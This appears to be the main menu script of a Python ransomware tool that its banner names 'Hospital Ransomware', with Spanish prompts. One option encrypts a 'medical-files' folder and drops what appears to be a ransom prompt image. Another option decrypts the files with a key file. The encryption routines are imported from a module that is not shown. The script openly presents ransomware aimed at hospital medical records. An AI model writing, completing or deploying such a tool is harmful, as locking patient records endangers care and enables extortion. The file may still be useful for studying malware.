import os
import sys

from src import encrypt_folder, decrypt_and_unpack, copy_prompt_image

def banner():
    print(r"""             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$*   *$$$*   *$$$$$$u
       *$$$$*      u$u       $$$$*
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         *$$$$uu$$$   $$$uu$$$$*
          *$$$$$$$*   *$$$$$$$*
            u$$$$$$$u$$$$$$$u
             u$*$*$*$*$*$*$u
  uuu        $$u$ $ $ $ $u$$       uuu
  u$$$$       $$$$$u$u$u$$$       u$$$$
  $$$$$uu      *$$$$$$$$$*     uu$$$$$$
u$$$$$$$$$$$uu    *****    uuuu$$$$$$$$$
$$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
 ***      **$$$$$$$$$$$uu **$***
          uuuu **$$$$$$$$$$uuu
 u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 $$$$$$$$$$****           **$$$$$$$$$$$*
   *$$$$$*                      **$$$$**
     $$$*                         $$$$* 
     _    _                 _ _        _   
    | |  | |               (_) |      | |  
    | |__| | ___  ___ _ __  _| |_ __ _| |  
    |  __  |/ _ \/ __| '_ \| | __/ _` | |  
    | |  | | (_) \__ \ |_) | | || (_| | |  
    |_|__|_|\___/|___/ .__/|_|\__\__,_|_|  
                     | |
     _____           |_|
    |  __ \                             
    | |__) |__ _ _ __ _ __  ___  _ __ ___  
    |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \ 
    | | \ \ (_| | | | \__ \ (_) | | | | | |
    |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|
                                            
                                    by Louden       
""")

def main():
    while True:
        banner()
        print("1. Cifrar archivos médicos")
        print("2. Descifrar archivos usando 'key.txt'")
        print("3. Salir")
        
        choice = input("\nSelecciona una opción [1-3]: ")

        if choice == "1":
            print("\n[*] Inicializando el proceso de cifrado...")
            encrypt_folder("medical-files", "files.enc")
            copy_prompt_image()

        elif choice == "2":
            print("\n[*] Inicializando el proceso de descifrado...")
            decrypt_and_unpack("files.enc", "key.txt", "restored_medical_files")
        
        elif choice == "3":
            print("\nSaliendo...")
            break
        
        else:
            print("\n[-] Opción inválida. Prueba de nuevo")
        
        input("\nPulsa Enter para vovler al menú")
        os.system('clear')

if __name__ == "__main__":
    main()